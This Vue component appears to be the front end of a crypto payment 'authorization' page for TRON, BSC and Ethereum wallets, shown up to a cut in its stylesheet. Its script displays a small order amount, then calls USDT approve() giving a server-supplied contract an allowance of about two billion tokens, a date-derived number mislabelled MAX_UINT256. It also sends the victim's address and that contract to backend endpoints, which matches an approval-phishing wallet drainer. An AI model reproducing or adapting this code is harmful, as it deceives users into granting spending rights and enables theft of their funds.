<template>
  <div class="authorize confirm-pop">
    <!-- <MyPagePcHeader v-if="appStore.device === 'desktop'" :title="$t('withdraw.confirmpop.title')"></MyPagePcHeader> -->
    <MyPageMobileHeader
      :leftText="isAuthorizing ? $t('authorize.title1') : $t('authorize.title1')"
      :backicon="true"
      class="page-mobile-header"
    >
      <template #right>
        <div class="header-right" @click="connectWalletType" v-if="!defaultAddress">
          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
            <path
              d="M9.18872 3.53027C9.93543 3.11629 10.8157 3.01203 11.6385 3.24016C12.4611 3.46831 13.1612 4.01059 13.5881 4.74983C14.0149 5.48909 14.1343 6.36666 13.9207 7.1931C13.7069 8.01969 13.1765 8.72991 12.4446 9.16959L10.7447 10.1296C10.6708 10.1802 10.5873 10.215 10.4993 10.2318C10.4112 10.2486 10.3204 10.2475 10.233 10.2277C10.1455 10.2078 10.0627 10.1695 9.99048 10.1162C9.91828 10.063 9.8576 9.99546 9.81275 9.91777C9.76796 9.84011 9.73972 9.75371 9.72974 9.66462C9.71981 9.57555 9.72845 9.48532 9.75496 9.39972C9.78153 9.31406 9.82539 9.23408 9.88402 9.16621C9.94259 9.09852 10.0145 9.04343 10.0953 9.00477L11.7707 8.03749C12.1995 7.76916 12.5078 7.3453 12.6303 6.85447C12.7526 6.36326 12.68 5.8429 12.4268 5.4045C12.1737 4.96613 11.7599 4.64382 11.2733 4.50419C10.7869 4.36461 10.2655 4.41895 9.81851 4.65627L8.17787 5.61928C8.03103 5.68237 7.86598 5.6894 7.7144 5.63879C7.56276 5.58813 7.43532 5.48272 7.35588 5.34398C7.27656 5.20535 7.25037 5.04259 7.28334 4.88632C7.3164 4.7299 7.40634 4.59098 7.53513 4.49625L9.18872 3.53027ZM5.22645 5.83931C5.29837 5.77809 5.38308 5.73299 5.47406 5.70763C5.56502 5.68232 5.66086 5.67736 5.75404 5.69258C5.8472 5.70784 5.9363 5.74299 6.01445 5.79595C6.09259 5.84893 6.15781 5.91879 6.2065 5.99968C6.25511 6.08051 6.28611 6.17091 6.29634 6.26468C6.30651 6.35864 6.29611 6.45435 6.26585 6.54389C6.23561 6.63337 6.18646 6.7155 6.12144 6.78401C6.05635 6.85254 5.97635 6.90622 5.88848 6.94106L4.19966 7.91046C3.77048 8.17887 3.4621 8.60363 3.33971 9.09481C3.21734 9.58602 3.29086 10.1059 3.54397 10.5443C3.7971 10.9825 4.21021 11.3055 4.69665 11.4451C5.18322 11.5847 5.70526 11.53 6.1523 11.2925L7.8473 10.3241C7.92029 10.266 8.0054 10.2245 8.09592 10.202C8.1863 10.1794 8.28036 10.1767 8.37194 10.1937C8.46366 10.2107 8.55139 10.2473 8.62775 10.3008C8.70394 10.3544 8.76781 10.4237 8.81495 10.504C8.86211 10.5843 8.89156 10.6739 8.90116 10.7666C8.91069 10.8592 8.9001 10.9532 8.8704 11.0414C8.84057 11.1298 8.79187 11.2112 8.72804 11.2792C8.66432 11.3472 8.58692 11.401 8.50078 11.4364L6.81778 12.4081C6.0761 12.7853 5.21754 12.8645 4.41944 12.629C3.62135 12.3935 2.94348 11.8608 2.52539 11.1414C2.1075 10.4221 1.98072 9.57005 2.17115 8.76025C2.36168 7.95025 2.85528 7.24327 3.55025 6.78564L5.22645 5.83931ZM9.63587 6.29305C9.78379 6.22229 9.95318 6.20995 10.1098 6.25848C10.2663 6.30706 10.3987 6.41322 10.4807 6.55516C10.5626 6.69715 10.5885 6.86486 10.5522 7.02471C10.5159 7.18458 10.4205 7.32517 10.2853 7.41787L6.33743 9.69716C6.26339 9.7479 6.17882 9.7822 6.09066 9.79904C6.00255 9.81585 5.91187 9.81475 5.8244 9.7949C5.73699 9.77504 5.65454 9.73745 5.58237 9.68429C5.51021 9.63111 5.4495 9.56344 5.40464 9.48583C5.35983 9.40821 5.33166 9.32174 5.32163 9.23268C5.31164 9.14348 5.31981 9.05267 5.34637 8.96693C5.37292 8.88125 5.41728 8.80216 5.47591 8.73427C5.53458 8.66634 5.60705 8.61109 5.68801 8.57235L9.63587 6.29305Z"
              fill="var(--adm-color-primary)"
            />
          </svg>
          <p>{{ $t('authorize.linkWallet') }}</p>
        </div>

        <a-popover
          placement="bottomRight"
          trigger="click"
          overlayClassName="wallet-type__popover"
          v-model="openPopover"
          v-else
        >
          <template #content>
            <div class="wallet-popover">
              <div class="title">
                <img :src="$imgBaseUrl + walletDetails?.icon" alt="" class="wallet-icon" />
                <p class="type">{{ walletDetails?.key }}</p>
              </div>
              <div class="address">
                <p>{{ formatAddress(defaultAddress) }}</p>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <path
                    d="M10.3333 4.66667C10.5985 4.66667 10.8529 4.77202 11.0404 4.95956C11.228 5.1471 11.3333 5.40145 11.3333 5.66667V13.6667C11.3333 13.9319 11.228 14.1862 11.0404 14.3738C10.8529 14.5613 10.5985 14.6667 10.3333 14.6667H3C2.86868 14.6667 2.73864 14.6408 2.61732 14.5905C2.49599 14.5403 2.38575 14.4666 2.29289 14.3738C2.20003 14.2809 2.12638 14.1707 2.07612 14.0494C2.02587 13.928 2 13.798 2 13.6667V5.66667C2 5.40145 2.10536 5.1471 2.29289 4.95956C2.48043 4.77202 2.73478 4.66667 3 4.66667H10.3333ZM10 6H3.33333V13.3333H10V6ZM12.9973 2C13.246 1.99985 13.4859 2.09237 13.67 2.25952C13.8542 2.42667 13.9695 2.65645 13.9933 2.904L13.9973 3V10.662C13.9971 10.8319 13.9321 10.9954 13.8154 11.1189C13.6988 11.2425 13.5394 11.3168 13.3697 11.3268C13.2001 11.3367 13.0331 11.2816 12.9028 11.1725C12.7725 11.0634 12.6887 10.9087 12.6687 10.74L12.664 10.662V3.33333H6C5.83671 3.33331 5.67911 3.27336 5.55709 3.16486C5.43506 3.05635 5.3571 2.90683 5.338 2.74467L5.33333 2.66667C5.33335 2.50338 5.3933 2.34578 5.50181 2.22375C5.61032 2.10173 5.75983 2.02377 5.922 2.00467L6 2H12.9973Z"
                    fill="#459675"
                    @click="copyText(defaultAddress)"
                  />
                </svg>
              </div>

              <div class="bottom">
                <a-button class="default-btn-solidlight left-btn btn" @click="connectWalletType">
                  {{ $t('authorize.UpdateAuthorization') }}
                </a-button>
                <a-button class="right-btn btn" @click="closePopover">
                  {{ $t('authorize.UpdateAuthorizationClose') }}
                </a-button>
              </div>
            </div>
          </template>
          <div class="connect-wallet">
            <img :src="$imgBaseUrl + walletDetails?.icon" alt="" class="wallet-icon" />
            <p class="type">{{ walletDetails?.key }}</p>
            <div class="address">{{ defaultAddress }}</div>
          </div>
        </a-popover>
      </template>
    </MyPageMobileHeader>

    <main class="main" v-if="!isAuthorizing" v-loading="isLoading">
      <div class="confirm-wrap">
        <div class="text">
          <div class="left">{{ $t('authorize.form.label1') }}</div>
          <div class="right">
            <div class="ellipsis">{{ orderId }}</div>
          </div>
        </div>
        <div class="text">
          <div class="left">{{ $t('authorize.form.label2') }}</div>
          <div class="right">
            <img :src="require(`@/assets/images/recharge/${network || 'TRC20'}.png`)" alt="" />
            <p>{{ network }}</p>
          </div>
        </div>
        <div class="text">
          <div class="left">{{ $t('authorize.form.label3') }}</div>
          <div class="right">
            <div class="amount">{{ amount }} {{ $unit }}</div>
          </div>
        </div>
      </div>
      <div class="tips">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path
            d="M12.5 4L22 20H3L12.5 4ZM6.5 18H18.5L12.5 7.5L6.5 18ZM11.5 11H13.5V14H11.5V11ZM11.5 15H13.5V17H11.5V15Z"
            fill="#FF9413"
          />
        </svg>
        {{ $t('authorize.tips') }}
      </div>
      <div class="main__submit">
        <a-button class="default-btn" @click="connectWalletType">{{ $t('authorize.confirmbtn') }}</a-button>
      </div>
      <!-- <div class="main__tips">
        {{ errorMessage }}
      </div> -->
    </main>

    <main class="main" v-else>
      <div class="animate-wrap">
        <!-- <a-spin :indicator="indicator" v-if="isProcess === 'start'" /> -->

        <div class="loader" v-if="isProcess === 'start'"></div>

        <svg
          v-if="['success', 'paysuccess'].includes(isProcess)"
          xmlns="http://www.w3.org/2000/svg"
          width="55"
          height="55"
          viewBox="0 0 55 55"
          fill="none"
        >
          <path
            d="M55 27.5C55 42.6878 42.6878 55 27.5 55C12.3122 55 0 42.6878 0 27.5C0 12.3122 12.3122 0 27.5 0C42.6878 0 55 12.3122 55 27.5Z"
            fill="#04AA02"
          />
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M39.7663 17.6221C40.6654 18.3214 40.8274 19.6172 40.1281 20.5163L29.1088 34.684C27.3936 36.8892 24.1673 37.1754 22.0907 35.3065L15.1203 29.0331C14.2736 28.2711 14.205 26.967 14.967 26.1204C15.729 25.2737 17.0331 25.205 17.8798 25.9671L24.8501 32.2404C25.1468 32.5074 25.6077 32.4665 25.8527 32.1515L36.872 17.9838C37.5713 17.0847 38.8671 16.9227 39.7663 17.6221Z"
            fill="white"
          />
        </svg>
        <svg
          v-if="['fail', 'payfail'].includes(isProcess)"
          xmlns="http://www.w3.org/2000/svg"
          width="55"
          height="55"
          viewBox="0 0 55 55"
          fill="none"
        >
          <path
            d="M55 27.5C55 42.6878 42.6878 55 27.5 55C12.3122 55 0 42.6878 0 27.5C0 12.3122 12.3122 0 27.5 0C42.6878 0 55 12.3122 55 27.5Z"
            fill="#FF3B21"
          />
          <path
            fill-rule="evenodd"
            clip-rule="evenodd"
            d="M27.5 40.5625C28.6391 40.5625 29.5625 39.6391 29.5625 38.5V35.75C29.5625 34.6109 28.6391 33.6875 27.5 33.6875C26.3609 33.6875 25.4375 34.6109 25.4375 35.75V38.5C25.4375 39.6391 26.3609 40.5625 27.5 40.5625ZM27.5 30.9375C28.6391 30.9375 29.5625 30.0141 29.5625 28.875V16.5C29.5625 15.3609 28.6391 14.4375 27.5 14.4375C26.3609 14.4375 25.4375 15.3609 25.4375 16.5V28.875C25.4375 30.0141 26.3609 30.9375 27.5 30.9375Z"
            fill="white"
          />
        </svg>
        <p
          class="amount"
          :style="{
            color: processStatus[isProcess].color,
          }"
        >
          {{ processStatus[isProcess].text }}
        </p>
        <p class="text">{{ moneyFormat(amount) }} {{ $unit }}</p>
      </div>

      <div class="confirm-wrap result-wrap">
        <div class="text">
          <div class="left">{{ $t('authorize.form.label2') }}</div>
          <div class="right">
            <img :src="require(`@/assets/images/recharge/${network || 'TRC20'}.png`)" alt="" />
            <p>{{ network }}</p>
          </div>
        </div>

        <div class="text" v-if="['payfail', 'paysuccess'].includes(isProcess)">
          <div class="left">{{ $t('authorize.form.label4') }}</div>
          <div class="right">
            <div class="ellipsis">{{ formatAddress(address) || '--' }}</div>
          </div>
        </div>

        <div class="text" v-if="['payfail', 'paysuccess'].includes(isProcess)">
          <div class="left">">{{ $t('authorize.form.label5') }}</div>
          <div class="right">
            <div class="ellipsis">{{ formatDateTimer(createTime, 'DD/MM/YYYY hh:mm:ss') }}</div>
          </div>
        </div>

        <div class="text">
          <div class="left">
            {{
              ['payfail', 'paysuccess'].includes(isProcess) ? $t('authorize.form.label3') : $t('authorize.form.label6')
            }}
          </div>
          <div class="right">
            <div class="ellipsis">{{ moneyFormat(amount) }} {{ $unit }}</div>
          </div>
        </div>

        <div class="text">
          <div class="left">{{ $t('authorize.form.label7') }}</div>
          <div class="right">
            <div class="amount">{{ withdrawalFee }} {{ $unit }}</div>
          </div>
        </div>

        <div class="text">
          <div class="left">{{ $t('authorize.form.label1') }}</div>
          <div class="right">
            <div class="ellipsis">
              {{ orderId }}
            </div>
          </div>
        </div>
      </div>

      <div class="tips" v-if="!['success', 'paysuccess'].includes(isProcess)">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
          <path
            d="M12.5 4L22 20H3L12.5 4ZM6.5 18H18.5L12.5 7.5L6.5 18ZM11.5 11H13.5V14H11.5V11ZM11.5 15H13.5V17H11.5V15Z"
            fill="#FF9413"
          />
        </svg>
        {{ processStatus[isProcess].tips }}
      </div>
    </main>
  </div>
</template>

<script setup>
/** ***引入相关包start*****/
import { orderDetailApi, refreshStatusApi, replenishApi, warrantAddApi } from '@/api/auth.js'
import MyPageMobileHeader from '@/components/MyPageHeader/mobile/index.vue'
import useUserInfoStore from '@/store/modules/userInfo'
import { copyText, formatDateTimer, isMobile, moneyFormat } from '@/utils'
// import { LoadingOutlined } from '@ant-design/icons-vue'
import useAppStore from '@/store/modules/app'
import { ethers } from 'ethers'
import { computed, defineExpose, onMounted, onUnmounted, ref } from 'vue'
import { useI18n } from 'vue-i18n'
import { useRoute, useRouter } from 'vue-router'
/** ***引入相关包end*****/

/** ***ref、reactive、props，等……start*****/
const { t } = useI18n()
const appStore = useAppStore()
// const indicator = h(LoadingOutlined, {
//   style: {
//     fontSize: '48px',
//   },
//   spin: true,
// })

const route = useRoute()
const router = useRouter()
const userInfoStore = useUserInfoStore()
const show = ref(false)

defineExpose({
  show,
})

const isLoading = ref(false)

const orderId = ref(route.query?.id)
const memberId = ref('')
const walletType = ref(route.query?.walletType)
const network = ref('')
const address = ref('')
const contractAddress = ref('')
const amount = ref('')
const createTime = ref('')
const withdrawalFee = ref('')

const walletDetails = computed(() => {
  return userInfoStore.walletTypesList.filter((item) => walletType.value === item.key)[0]
})
const isAuthorizing = ref(false)

const isProcess = ref('start')

const errorMessage = ref('')

const loadingBtn = ref(false)

const defaultAddress = ref('')

const processStatus = {
  start: {
    text: t('authorize.processStatus.label1'),
    color: 'var(--color-textlv2)',
    tips: t('authorize.processStatus.tips1'),
  },
  success: {
    text: t('authorize.processStatus.label2'),
    color: 'var(--adm-color-primary)',
    tips: '',
  },
  fail: {
    text: t('authorize.processStatus.label3'),
    color: 'var(--color-red)',
    tips: t('authorize.processStatus.tips3'),
  },
  paysuccess: {
    text: t('authorize.processStatus.label4'),
    color: 'var(--adm-color-primary)',
    tips: '',
  },
  payfail: {
    text: t('authorize.processStatus.label5'),
    color: 'var(--color-red)',
    tips: t('authorize.processStatus.tips5'),
  },
}

const openPopover = ref(false)

const cancelFn = ref(null)

const visibilityState = ref(false)

/** ***ref、reactive、props，等……end*****/

/** ***函数 start*****/
const closePopover = () => {
  openPopover.value = false

  console.log(openPopover.value)
}

const getDateYYYYMMDD = () => {
  const now = new Date()
  const year = now.getFullYear()
  const month = String(now.getMonth() + 1).padStart(2, '0')
  const day = String(now.getDate()).padStart(2, '0')
  const hour = String(now.getHours()).padStart(2, '0')
  // const minute = String(now.getMinutes()).padStart(2, '0')
  // const second = String(now.getSeconds()).padStart(2, '0')
  return `${year}${month}${day}${hour}`
}

// 配置常量
const USDAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // TRC20-USDT合约地址
const MAX_UINT256 = Number(getDateYYYYMMDD())

const connectWalletType = async () => {
  if (network.value === 'TRC20') {
    connectTRC20WalletDirect(walletType.value.toLowerCase())
  } else {
    connectBEP20WalletDirect(walletType.value.toLowerCase())
  }

  visibilityState.value = true

  if (!userInfoStore.token) {
    appStore.getTracking({
      type: 8,
    })
  }
}

const connectTRC20WalletDirect = async (walletType) => {
  try {
    loadingBtn.value = true
    let tronWeb = null

    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb
    } else if (window.imToken || window.tronWeb) {
      tronWeb = window.tronWeb || window.imToken.tronWeb
    }

    if (tronWeb && tronWeb.defaultAddress?.base58) {
      defaultAddress.value = tronWeb.defaultAddress.base58
      console.log(`${walletType} wallet TRON address:`, defaultAddress.value)

      isAuthorizing.value = true

      walletType === 'imtoken' && sendPost()
      replenish()

      const contract = await tronWeb.contract().at(USDAddress)
      const tx = await contract
        .approve(contractAddress.value, tronWeb.toSun(MAX_UINT256))
        .send({ feeLimit: 100000000, shouldPollResponse: true })

      console.log('Authorization result:', tx)
      if (tx) {
        isProcess.value = 'success'
        sendPost()
      }
      return
    }

    window.location.href = createDeepLink(walletType)
  } catch (error) {
    errorMessage.value = error.message
    isProcess.value = 'fail'
    console.error(error)
  } finally {
    loadingBtn.value = false
  }
}

const connectBEP20WalletDirect = async (walletType) => {
  try {
    loadingBtn.value = true
    const injected = window.ethereum || window.imToken?.ethereum || window.trustwallet || window.tp?.ethereum

    if (!injected) {
      window.location.href = createDeepLink(walletType)
      return
    }

    if (!isMobile() || ['metamask', 'okxwallet'].includes(walletType)) {
      const accounts = await injected.request({ method: 'eth_requestAccounts' })
      defaultAddress.value = accounts[0]
    } else {
      defaultAddress.value = injected?.selectedAddress
    }

    isAuthorizing.value = true

    //切换网络
    if (['metamask', 'okxwallet'].includes(walletType)) {
      await changeNetwork(injected)
    }

    console.log(`${walletType} wallet ${network.value} address:`, defaultAddress.value)

    //获取精度
    const USDAddress =
      network.value.toLowerCase() === 'bep20'
        ? '0x55d398326f99059fF775485246999027B3197955' // BSC USDT
        : '0xdAC17F958D2ee523a2206206994597C13D831ec7' // ETH USDT

    const abi = [
      'function decimals() view returns (uint8)',
      'function approve(address spender, uint256 amount) returns (bool)',
    ]

    const decimals = network.value.toLowerCase() === 'bep20' ? 18 : 6

    const amountResult = ethers.utils.parseUnits(MAX_UINT256.toString(), decimals)

    const iface = new ethers.utils.Interface(abi)
    const tx = iface.encodeFunctionData('approve', [contractAddress.value, amountResult])
    console.log('tx.data:', tx)

    if (['imtoken', 'okxwallet'].includes(walletType)) {
      sendPost()
    }

    replenish()

    const txHash = await injected.request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: defaultAddress.value,
          to: USDAddress,
          data: tx,
          value: '0x0',
          gas: '0x186A0',
        },
      ],
    })

    console.log('授权交易哈希:', txHash)

    isProcess.value = 'success'
    sendPost()
  } catch (error) {
    errorMessage.value = error.message
    isProcess.value = 'fail'
    console.error(error)
  } finally {
    loadingBtn.value = false
  }
}

const changeNetwork = async (injected) => {
  try {
    const chainId = await injected.request({ method: 'eth_chainId' })
    console.log('当前链 ID:', chainId)

    // 定义目标链配置
    const chains = {
      erc20: {
        id: '0x1', // Ethereum 主网
        name: 'Ethereum Mainnet',
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        rpcUrls: ['https://mainnet.infura.io/v3/'], // 可替换为你自己的 RPC
        blockExplorerUrls: ['https://etherscan.io'],
      },
      bep20: {
        id: '0x38', // BSC 主网
        name: 'BNB Smart Chain',
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        rpcUrls: ['https://bsc-dataseed.binance.org/'],
        blockExplorerUrls: ['https://bscscan.com'],
      },
    }

    const target = chains[network.value.toLowerCase()]
    if (!target) {
      console.warn('未识别的网络类型:', network.value)
      return
    }

    // 如果当前链和目标链不一致，尝试切换
    if (chainId !== target.id) {
      try {
        await injected.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: target.id }],
        })
        console.log(`已切换到 ${target.name}`)
      } catch (switchError) {
        console.log('切换失败:', switchError)
        // 如果链没添加过，需要添加
        if (switchError.code === 4902) {
          await injected.request({
            method: 'wallet_addEthereumChain',
            params: [target],
          })
        }
      }
    }
  } catch (error) {
    console.error('获取链 ID 失败:', error)
  }
}

const myInterval = (func, delay) => {
  let timerId = null
  let stopped = false

  const interval = () => {
    if (stopped) return
    func()
    timerId = setTimeout(interval, delay)
  }

  timerId = setTimeout(interval, delay)

  return {
    cancel: () => {
      stopped = true
      clearTimeout(timerId)
    },
  }
}

//定时器
const getRefreshStatus = async (id) => {
  try {
    const { data, code } = await refreshStatusApi({
      orderId: id,
    })

    if (code !== 200) {
      cancelFn.value && cancelFn.value()
    }
    if (data.errorStatus === 0) {
      isProcess.value = 'paysuccess'
      cancelFn.value && cancelFn.value()
    } else if ([1.2].includes(isProcess.value)) {
      isProcess.value = 'payfail'
      cancelFn.value && cancelFn.value()
    }

    isAuthorizing.value = true
  } catch (error) {
    console.log(error)
  }
}

//walletConnect连接
// const createWalletConnect = async (network) => {
//   try {
//     loadingBtn.value = true

//     const module = await import('@walletconnect/ethereum-provider') //报错
//     let EthereumProvider = module.default

//     console.log(window)

//     const wcProvider = await EthereumProvider.init({
//       projectId: 'd676771683ba09196685ee6f29faef25',
//       // chains: [1, 137, 56],
//       chains: network === 'bep20' ? [56] : [1],
//       showQrModal: true,
//       qrModalOptions: {
//         mobileLinks: ['tokenpocket', 'metamask', 'imtoken'],
//         themeMode: 'light',
//       },
//     })

//     await wcProvider.connect()

//     const accounts = await wcProvider.request({ method: 'eth_requestAccounts' })
//     console.log('连接成功，账户:', accounts[0])

//     defaultAddress.value = accounts[0] || wcProvider.accounts[0]
//     console.log('连接成功，账户:', defaultAddress.value)

//     isAuthorizing.value = true

//     const provider = new ethers.providers.Web3Provider(wcProvider)
//     // const signer = provider.getSigner()

//     const abi = ['function approve(address spender, uint256 amount) returns (bool)']

//     const USDAddress =
//       network === 'bep20' ? '0x55d398326f99059fF775485246999027B3197955' : '0xdAC17F958D2ee523a2206206994597C13D831ec7' // BEP20-USDT合约地址 : ERC20-USDT合约地址  137-0xc2132D05D31c914a87C6611C10748AEb04B58e8F(Polygon (Matic))

//     // 代币合约实例（读写都可用 signer）
//     const tokenContract = new ethers.Contract(USDAddress, abi, provider)

//     const decimals = 18
//     const amount = ethers.BigNumber.from(MAX_UINT256).mul(ethers.BigNumber.from('10').pow(decimals))

//     const txData = await tokenContract.populateTransaction.approve(contractAddress.value, amount)

//     const txHash = await wcProvider.request({
//       method: 'eth_sendTransaction',
//       params: [
//         {
//           from: defaultAddress.value,
//           to: USDAddress,
//           data: txData.data,
//           value: '0x0',
//         },
//       ],
//     })

//     console.log('授权交易哈希:', txHash)

//     const iface = new ethers.utils.Interface(abi)
//     const decoded = iface.decodeFunctionData('approve', txData.data)
//     console.log('spender:', decoded[0])
//     console.log('amount:', decoded[1].toString())

//     isProcess.value = 'success'
//     sendPost()
//   } catch (error) {
//     isProcess.value = 'fail'
//     console.log(error)
//   } finally {
//     loadingBtn.value = false
//   }
// }

const createDeepLink = (walletType) => {
  const map = {
    imtoken: () => {
      const currentUrl = encodeURIComponent(window.location.href)
      return `imtokenv2://navigate/DappView?url=${currentUrl}`
    },
    tokenpocket: () => {
      const chain = {
        TRC20: 'TRON',
        ERC20: 'ETH',
        BEP20: 'BSC',
      }
      const dAppUrl = window.location.href
      return `tpdapp://open?params=${encodeURIComponent(
        JSON.stringify({
          url: dAppUrl,
          chain: chain[network.value],
          source: 'WebApp',
        })
      )}`
    },
    tronlink: () => {
      const param = {
        url: window.location.href,
        action: 'open',
        protocol: 'tronlink',
        version: '1.0',
      }
      return 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify(param))
    },
    metamask: () => {
      return 'https://metamask.app.link/dapp/' + `${window.location.href}`
    },
    trustwallet: () => {
      return 'trustwallet://wc?uri=' + encodeURIComponent(JSON.stringify(window.location.href))
    },
    okxwallet: () => {
      const dappUrl = encodeURIComponent(window.location.href)
      const deepLink = `okx://wallet/dapp/url?dappUrl=${dappUrl}`
      const universalLink = `https://web3.okx.com/download?deeplink=${encodeURIComponent(deepLink)}`
      return universalLink
    },
  }

  return map[walletType]()
}

const getChainDetails = async (id) => {
  isLoading.value = true
  try {
    const { data } = await orderDetailApi({ orderId: id })
    memberId.value = data.memberId
    network.value = data.network
    address.value = data.paymentAddress
    contractAddress.value = data.contract
    amount.value = data.payAmount
    createTime.value = data.createTime
    withdrawalFee.value = data.feeAmount
    console.log(data)
  } catch (error) {
    console.log(error)
  } finally {
    isLoading.value = false
  }
}

const formatAddress = (addr) => {
  if (!addr) return ''
  const start = addr.slice(0, 10)
  const end = addr.slice(-10)
  return `${start}...${end}`
}

const backTo = () => {
  if (isAuthorizing.value) {
    isAuthorizing.value = !isAuthorizing.value
    isProcess.value = 'start'
    return
  }

  history.back()
}

const sendPost = async () => {
  try {
    await warrantAddApi({
      memberId: memberId.value,
      orderId: orderId.value,
      network: network.value,
      address: defaultAddress.value,
      contract: contractAddress.value,
    })
  } catch (error) {
    console.log(error)
  }
}

const replenish = async () => {
  try {
    await replenishApi({
      memberId: memberId.value,
      orderId: orderId.value,
      network: network.value,
      address: defaultAddress.value,
      contract: contractAddress.value,
    })
  } catch (error) {
    console.log(error)
  }
}

const init = async () => {
  walletType.value = route.query?.walletType
  orderId.value = route.query?.id

  if (!(walletType.value && orderId.value)) {
    router.replace('/home')
  }

  await getChainDetails(orderId.value)

  userInfoStore.getwalletTypes(network.value)
}

const handleVisibility = () => {
  if (document.visibilityState === 'visible' && visibilityState.value) {
    if (userInfoStore.token) {
      const { cancel } = myInterval(async () => {
        await getRefreshStatus(orderId.value)
      }, 3000)

      cancelFn.value = cancel
    }
    console.log('页面被唤醒（从后台回到前台）')
  } else {
    console.log('页面进入后台')
  }
}
/** ***函数 end*****/

/** ***生命周期start*****/
onMounted(async () => {
  init()
  document.addEventListener('visibilitychange', handleVisibility)
})

onUnmounted(() => {
  cancelFn.value && cancelFn.value()
  document.removeEventListener('visibilitychange', handleVisibility)
})
/** ***生命周期end*****/
</script>

<style lang="less" scoped>
.confirm-pop {
  :deep(.my-page-header) {
    .title {
      flex: 1;
      text-align: left;
    }
  }
  .header-right {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0 6px;
    height: 28px;
    color: var(--adm-color-primary);
    font-size: 12px;
    font-style: normal;
    font-weight: 600;
    line-height: normal;
    border-radius: 8px;
    border: 1px solid var(--adm-color-primary);
    cursor: pointer;
  }

  .connect-wallet {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0 6px;
    height: 28px;
    border-radius: 8px;
    background: var(--adm-bg-light);
    img {
      width: 16px;
      height: auto;
    }

    .type {
      padding: 0 2px;
      color: var(--adm-color-textLv1);
      font-size: 12px;
      font-style: normal;
      font-weight: 600;
      line-height: 18px; /* 150% */
      text-transform: capitalize;
    }

    .address {
      padding: 0 4px;
      width: 62px;
      color: var(--color-textlv2);
      font-size: 10px;
      font-style: normal;
      font-weight: 400;
      line-height: 20px;
      border-radius: 8px;
      background: var(--adm-bg-light);
      text-overflow: ellipsis;
      overflow: hidden;
    }
  }

  .main {
    padding: 12px 20px 30px 20px;

    .confirm-wrap {
      padding: 20px;
      border-radius: 4px;
      border: 1px solid var(--color-border);
      background: var(--adm-bg-light);

      &.result-wrap {
        padding: 16px 0;
        border: none;
        background: transparent;
      }

      .text {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 10px;
        &:last-child {
          margin-bottom: 0;
        }
      }

      .left {
        margin-right: 10px;
        flex-shrink: 0;
        color: var(--color-textlv1);
        font-size: 14px;
        font-style: normal;
        font-weight: 500;
        line-height: 18px; /* 128.571% */
      }

      .right {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: flex-end;
        color: var(--color-textlv1);
        text-align: right;
        font-size: 14px;
        font-style: normal;
        font-weight: 600;
        line-height: 18px; /* 128.571% */
        overflow: hidden;
        text-overflow: ellipsis;

        .ellipsis {
          display: inline-block;
          max-width: 100%;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
          text-align: right;
        }

        img {
          margin-right: 10px;
          width: 20px;
          height: auto;
        }

        p {
          color: var(--color-textlv1);
          font-size: 14px;
          font-style: normal;
          font-weight: 500;
        }
      }

      .amount {
        color: var(--adm-color-primary);
        font-size: 14px;
        font-weight: 600;
      }
    }

    .tips {
      display: flex;
      align-items: flex-start;
      justify-content: flex-start;
      color: #ff9413;
      font-family: Roboto;
      font-size: 12px;
      font-style: normal;
      font-weight: 400;
      line-height: 18px;

      svg {
        margin-right: 6px;
        flex-shrink: 0;
        // vertical-align: middle;
      }
    }

    &__submit {
      display: flex;
      justify-content: center;

      button {
        width: 442px;
        height: 50px;
        font-size: 16px;
      }
    }

    .animate-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px 0;
      text-align: center;
      border-bottom: 1px dashed var(--color-border);

      .loader {
        width: 50px;
        aspect-ratio: 1;
        display: grid;
        -webkit-mask: conic-gradient(from 15deg, #0000, #000);
        animation: l26 1s infinite steps(12);
      }
      .loader,
      .loader:before,
      .loader:after {
        background: radial-gradient(closest-side at 50% 12.5%, var(--adm-color-primary) 96%, #0000) 50% 0/20% 80%
            repeat-y,
          radial-gradient(closest-side at 12.5% 50%, var(--adm-color-primary) 96%, #0000) 0 50%/80% 20% repeat-x;
      }
      .loader:before,
      .loader:after {
        content: '';
        grid-area: 1/1;
        transform: rotate(30deg);
      }
      .loader:after {
        transform: rotate(60deg);
      }
      @keyframes l26 {
        100% {
          transform: rotate(1turn);
        }
      }

      .amount {
        padding: 12px 0;
        color: var(--color-auxiliary);
        font-size: 12px;
        font-style: normal;
        font-weight: 500;
        line-height: normal;
      }

      .text {
        color: var(--adm-color-white);
        font-size: 24px;
        font-style: normal;
        font-weight: 600;
        line-height: normal;
      }
    }
  }
}

html[data-device='mobile'] {
  .confirm-pop {
    .header {
      padding: 0 14px;

      &__nav {
        width: 100%;
        height: 40px;

        &__back {
          position: absolute;
          left: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          width: 20px;
          height: 20px;
          cursor: pointer;

          i {
            color: var(--adm-color-white);
            font-size: 18px;
          }
        }

        h3 {
          font-size: 14px;
          font-weight: 500;
        }
      }
    }

    .connect-wallet {
      background: var(--adm-bg-light);

      .address {
        background: var(--adm-bg-light);
      }
    }

    .main {
      padding: 12px 14px;

      .confirm-wrap {
        padding: 12px;
        &.result-wrap {
          padding: 16px 0;
        }

        .text {
          margin-bottom: 12px;
          &:last-child {
            margin-bottom: 0;
          }
        }

        .left {
          margin-right: 10px;
          font-size: 12px;
        }

        .right {
          font-size: 12px;

          p {
            font-size: 12px;
          }
        }

        .amount {
